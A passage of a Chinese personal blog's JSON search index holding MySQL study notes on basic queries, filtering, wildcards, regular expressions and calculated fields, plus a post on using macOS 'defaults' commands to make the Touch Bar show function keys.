删除数据时为保险起见，使用TRIGGER备份被删除条目；TODO  1 2  updatecustomerssetcust_name=\u0026#39;The Fudds\u0026#39;,cust_email=\u0026#39;elmer@fudd.com\u0026#39;wherecust_id=10005;  ","permalink":"https://blog.pseudocold.com/post/2018/mysql-crashcourse-02/","tags":["mysql"],"title":"MySQL必知必会：11-20"},{"categories":["Notes"],"contents":"《MySQL必知必会》个人笔记，不做解读。\n名词解释\n DBMS，database management system，数据库管理系统。 schema，模式，关于数据库和表的布局及特性的信息。 SQL，sequel。结构化查询语言（Structured Query Language）  存储引擎，show engines.\n 查看单个数据库所使用的引擎，show variables like 'storage_engine; InnoDB, 事务型数据库首选引擎 MyISAM，较高的插入、查询速度。不支持事务，但支持全文检索 MEMORY： 所有的数据都在内存中，数据的处理速度快，但是安全性不高  关键词次序\n select from where group by having order by limit  MySQL中双引号、单引号、反引号没有区别？都可以用来显示表明字符串。\n.sql脚本注释符，行内注释/* */, 整行注释--开头。\n复习完后参考一下其他人笔记\n 读书笔记——MySQL必知必会 MySQL笔记  面试前有时间把书中内容全部敲一遍。\nChapter 03: 使用 MySQL 使用 .sql 脚本创建数据库信息\n create database db_name; use db_name; source path_to_file/filename.sql; 删除数据库时使用 drop database db_name;  列出数据库，show databases;\n列出表，show tables;。需要先选中一个数据库；\n列出列名\n show columns from table_name; describe table_name; 在 MySQL 同样用来查看列；  显示授权用户权限，show grants;\nChapter 04: 检索数据 注：SQL 语句 不区分大写小 ;\n 标识符 (如数据库名、表名、列名) 可能区分大小写：  MySQL 4.1 及之前版本中，标识符默认 (可以变更) 是区分大小写的； MySQL 4.1.1 版本中，标识符默认不再区分大小写；   SQL 语句以分号 ; 为结束符，可以使用空格、换行使其容易阅读； 通配符 * 用来检索所有项，但检索不必要的列会降低检索性能； 检索结果项目的顺序可能是数据被添加到表中的顺序，也可能不是(更新、删除过)； 检索只返回不同值 DISTINCT 关键词，select distinct col_name from table_name; 限制检索结果，LIMIT. select col_name from table_name limit 5，限制返回 5 项；  limit 5,5，从第 5 行开始返回 5 项；行序号从 0 开始；项目数目不足时只返回那么多； MySQL 支持 limit 另外一种替代语法：limit 4 offset 3，从索引 3 的行开始返回 4 项；   列名冲突，不同表中列的列名可能发生冲突，可能给检索带来不便。使用完全限定的名字来引用列、表：  table_name.col_name，使用 . 点号分隔，完全限定列名； 亦或 db_name.table_name完全限定表名，    1 2 3 4  select*fromproducts;selectdistinctvend_idfromproducts;selectprod_namefromproductslimit5,5;selectproducts.prod_namefromcrashcourse.products;  Chapter 05: 排序检索数据  不明确规定排序顺序时，不应该假定检索出来数据的排序有意义； select col_name from table_name order by col_name[,another_name] [desc];  与 DESC 对应的升序关键词是 ASC，但后者没什么用处，毕竟是作为默认值；   排序时可以使用非选择列，即使用没有输出的列。同时降序关键字也要对每个排序列单独使用； MySQL 默认不区分大小写，可以通过服务端配置开启大小写敏感； order by必须位于from之后  1 2 3  -- 多个排序依据 selectprod_id,prod_price,prod_namefromproductsorderbyprod_price,prod_name;selectprod_id,prod_price,prod_namefromproductsorderbyprod_pricedesc,prod_name;  Chapter 06-07: 过滤数据 search criteria, filter condition\n where col_name=value 过滤一个列具有指定值；  如果过滤值为字符串，则需要为 value 使用引号 (单双均可)； where col_name BETWEEN value_a and value_b，范围筛选，闭区间范围； where col_name is NULL，空值筛选； 不匹配筛选不会返回 NULL 的行，因为 NULL 未知具有特殊意义，数据库无法知道它们是否匹配；   NULL 代表没有设置，而不是不匹配； SQL 过滤与应用过滤，通常前者发生在服务端，而后者发生在客户端；前者服务端过滤优先，以免影响客户端性能； 组合 where 子句过滤；  and \u0026gt; or 圆括号对过滤子句分组影响结合顺序； where col_name in (value1,value2,value3);   in 操作符的特别  in 操作符的执行比 or 快，尽管后者也可以查询出相同结果； in 操作符可以后接其他 select 语句，即从筛选结果中再次筛选；   not 操作符用在上面几种逻辑操作符之前，否定；  MySQL 支持 not 对 in, between, exists 子句取反，这与其他 DBMS 中 not 对各种条件取反有很大差别；   order by位于where之后  1 2 3 4 5 6 7 8  selectprod_name,prod_pricefromproductswhereprod_price=2.50;-- where prod_name = \u0026#39;fuses\u0026#39;; -- where prod_price \u0026lt; 10; -- where prod_price \u0026lt;= 10; -- \u0026lt;\u0026gt; != selectprod_name,prod_pricefromproductswhereprod_pricebetween5and10;selectcust_idfromcustomerswherecust_emailisnull;  logical operator\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  selectprod_id,prod_price,prod_namefromproductswherevend_id=1002andprod_price\u0026lt;=10;-- 逻辑优先级 and \u0026gt; or selectprod_name,prod_pricefromproductswherevend_id=1002orvend_id=1003andprod_price\u0026gt;=10;-- 实际列出了价格小于10元商品 selectprod_name,prod_pricefromproductswhere(vend_id=1002orvend_id=1003)andprod_price\u0026gt;=10;-- where vend_id in (1002, 1003) and prod_price \u0026gt;= 10;   Chapter 08: 通配符过滤 like 操作符，从头匹配。LIKE匹配整个列\n通配符 (wildcard): % 匹配任意个字符，_ 匹配一个字符；\n select col_name from table_name where col_name like [binary] 'anvil%' 匹配模式前加 bianry 关键字将严格区分匹配字符大小写； 尾空格将影响字符匹配，可以再匹配字符串尾加 % 或是使用函数去除尾空格； '%' 不能匹配 null；  通配符使用技巧\n 通配符比其他搜索消耗大； 不要过度使用通配符，优先使用其他操作符筛选； 尽量不要把通配符使用在搜索字符串的开始处，以免影响搜索速度；  like是谓词\nChapter 09: 用正则表达式进行搜索 regexp 操作符\n 匹配字符串一定要使用引号引起来；  like, regexp 比较\n like 匹配整个列，即列内容从头匹配到尾； regexp 在列的值内匹配，出现即匹配成功；使用 ^$ 定位符也可以做到整列匹配； 二者匹配均不区分大小写，需要在匹配模式字符串前使用 binary 关键词；  MySQL 中转义需要使用双反斜杠，MySQL 自身解释一个，正则表达式库解释一个。例如 \\\\-, \\\\., \\\\\\；\nregexp表达式不加^$则匹配部分，一旦匹配成功，返回整列内容。\n1 2  selectprod_namefromproductswhereprod_nameregexp\u0026#39;1000|2000\u0026#39;orderbyprod_name;selectprod_namefromproductswhereprod_nameregexp\u0026#39;[123] Ton\u0026#39;orderbyprod_name;  匹配字符类 (预定义字符集)    类 说明     [:alnum:] 任意字母和数字（同 [a-zA-Z0-9]）   [:alpha:] 任意字符（同 [a-zA-Z]）   [:blank:] 空格和制表（同 [\\\\t]）   [:cntrl:] ASCII 控制字符（ASCII 0 到 31 和 127）   [:digit:] 任意数字（同 [0-9]）   [:graph:] 与 [:print:] 相同，但不包括空格   [:lower:] 任意小写字母（同 [a-z]）   [:print:] 任意可打印字符   [:punct:] 既不在 [:alnum:] 又不在 [:cntrl:] 中的任意字符   [:space:] 包括空格在内的任意空白字符（同 [\\\\f\\\\n\\\\r\\\\t\\\\v]）   [:upper:] 任意大写字母（同 [A-Z]）   [:xdigit:] 任意十六进制数字（同 [a-fA-F0-9]）    以上字符类使用时要额外使用中括号，即两层中括号 [[:digit:]]。[:digit:] 仅代表数字的一个集合，再加上一层 [] 表示匹配集合中任意一个数字；\n定位元字符\n [[:\u0026lt;:]]，词的开始； [[:\u0026gt;:]]，词的结束；  简单的正则表达式测试，select 'test_string' regexp '[0-9]';\n1 2 3 4  selectprod_namefromproductswhereprod_nameregexp\u0026#39;\\\\([0-9] sticks?\\\\)\u0026#39;orderbyprod_name;-- where prod_name regexp \u0026#39;[[:digit:]]{4}\u0026#39; order by prod_name; -- \u0026#39;[0-9\\\\.]\u0026#39;   Chapter 10: 创建计算字段 (field) 计算字段，运行 select 语句内创建的字段\n 筛选输出不同表中的数据； 合并输出不同列内容； 改变输出数据格式 (大小写)； 计算总值、平均值等；  拼接字段 (concatenation)\n select concat(col_name_1,string1,col_name_2,string2) from... trim(col_name) 删除列中左右空格，另外还有 ltrim(), rtrim()； 别名 as, 又称导出列(derived column)  select sth as alias_name from 别名也可视作重命名，以解决不规则命名 (含空格) 的列名，或是容易混淆的列名等等；    执行算术计算\n select col_name_1*col_name_2 as alias_name from... 算术支持简单的 +, -, *, /  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  selectconcat(vend_name,\u0026#39; (\u0026#39;,vend_country,\u0026#39;)\u0026#39;)fromvendorsorderbyvend_name;-- 表头 concat(vend_name, \u0026#39; (\u0026#39;, vend_country, \u0026#39;)\u0026#39;) -- trim, 此处无意义，只是作为演示 -- concat(rtrim(vend_name), \u0026#39; (\u0026#39;, rtrim(vend_country), \u0026#39;)\u0026#39;) -- use alias as title selectconcat(vend_name,\u0026#39; (\u0026#39;,vend_country,\u0026#39;)\u0026#39;)asvend_titlefromvendorsorderbyvend_name;-- calc price selectprod_id,quantity,item_price,quantity*item_priceasexpanded_pricefromorderitems;  ","permalink":"https://blog.pseudocold.com/post/2018/mysql-crashcourse-01/","tags":["mysql"],"title":"MySQL必知必会：01-10"},{"categories":["gui"],"contents":"Touchbar 上不能默认显示功能键，苹果只给出单独设置某个应用默认为功能键的方案，参考如何在配备 Multi-Touch Bar 的 MacBook Pro 上使用功能键。但实际上存在隐藏配置项，可以将功能键作为默认显示。\n更新：貌似 macOS 10.13 将此隐藏项放到了系统设置中。也就是说，此项不再隐藏。本文唯一意义是实现此更改的完全命令行操作。\n TouchBar 隐藏设置项 思路来源自此 reddit 提问，提问者需要添加 JDK 为默认显示功能键，有回答者给出了 defaults 命令修改 com.apple.touchbar.agent domain，直接添加 JDK 绝对位置。（因为 JDK 没有安装到 /Applications 下，“键盘设置\u0026ndash;快捷键\u0026ndash;功能键”无法添加此应用。\n首先在 \u0026ldquo;System Settings - Keyboard\u0026rdquo; 更改 \u0026ldquo;Touch Bar show\u0026rdquo;, \u0026ldquo;Press Fn key to\u0026rdquo;，以及 \u0026ldquo;System Settings - Keyboard - Shortcuts\u0026rdquo; 中更改 \u0026ldquo;Function Keys\u0026rdquo; 项。这样的话，com.apple.touchbar.agent 域中值将发生变化。\n1 2 3 4 5 6 7 8 9 10 11 12  ❯ defaults read com.apple.touchbar.agent { PresentationModeFnModes = { appWithControlStrip = functionKeys; }; PresentationModeGlobal = fullControlStrip; PresentationModePerApp = { \u0026#34;com.binarynights.ForkLift-3\u0026#34; = functionKeys; \u0026#34;com.microsoft.VSCode\u0026#34; = functionKeys; \u0026#34;com.sublimetext.3\u0026#34; = functionKeys; }; }   通过输出 com.apple.touchbar.agent 中值，可以很容易推测出它们与 \u0026ldquo;System Settings\u0026rdquo; 设置的对应关系。\n   System Settings - Keyboard com.apple.touchbar.agent Available values     Touch Bar show PresentationModeGlobal appWithControlStrip(default), app, fullControlStrip, functionKeys   Press Fn key to PresentationModeFnModes same with above.   Shortcuts - Function Keys PresentationModePerApp same with above.    defaults 命令设置 Touch Bar 默认显示为功能键 F1-F12 问题就在于 \u0026ldquo;Touch Bar show\u0026rdquo; 没有给出对应 functionKeys 的下拉选项。所以，直接通过命令行修改接口达成目的。\n1 2 3 4 5 6 7 8 9 10 11  # 默认显示功能键 defaults write com.apple.touchbar.agent PresentationModeGlobal functionKeys \\  \u0026amp;\u0026amp; defaults write com.apple.touchbar.agent PresentationModeFnModes {} # 默认显示功能键，Fn 按下后依然显示功能键 defaults write com.apple.touchbar.agent PresentationModeGlobal functionKeys \\  \u0026amp;\u0026amp; defaults write com.apple.touchbar.agent PresentationModeFnModes {} \\  \u0026amp;\u0026amp; defaults write com.apple.touchbar.agent PresentationModeFnModes -dict-add functionKeys functionKeys # 重启TouchBarServer，使其重新读取配置 sudo killall TouchBarServer   另外，直接注意的是，PresentationModePerApp 没有其对应项，也就是目前没有为某个应用单独设置Fn按下时 TouchBar 显示内容。Fn按下时 TouchBar 显示内容只存在一个全局设置项。\n其他一些 defaults 命令用法示例。（有些没有实际意义，仅作为命令使用的参考）。更多参考 man defaults。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  defaults read com.apple.touchbar.agent defaults write com.apple.touchbar.agent PresentationModeGlobal appWithControlStrip(default)|app|fullControlStrip|functionKeys defaults write com.apple.touchbar.agent PresentationModeFnModes {} defaults write com.apple.touchbar.agent PresentationModeFnModes -dict-add key value defaults write com.apple.touchbar.agent PresentationModeGlobal functionKeys \\  \u0026amp;\u0026amp; defaults write com.apple.touchbar.agent PresentationModeFnModes {} defaults write com.apple.touchbar.agent PresentationModeGlobal functionKeys \\  \u0026amp;\u0026amp; defaults write com.apple.touchbar.agent PresentationModeFnModes {} \\  \u0026amp;\u0026amp; defaults write com.apple.touchbar.agent PresentationModeFnModes -dict-add functionKeys functionKeys defaults delete com.apple.touchbar.agent PresentationModeGlobal defaults write com.apple.touchbar.agent PresentationModeFnModes {}   检查应用对应的 bundle id How to get Bundle ID of Mac application? from StackOverflow\n1 2 3 4  osascript -e \u0026#39;id of app \u0026#34;SomeApp\u0026#34;\u0026#39; # or mdls -name kMDItemCFBundleIdentifier -r SomeApp.app   ","permalink":"https://blog.pseudocold.com/post/2018/function-key-in-touchbar/","tags":["macos","touchbar","defaults"],"title":"强制 MacBook Touchbar显示为 Function Key 功能键"},{"categories":null,"contents":"","permalink":"https://blog.pseudocold.com/search/","tags":null,"title":"🔍"}]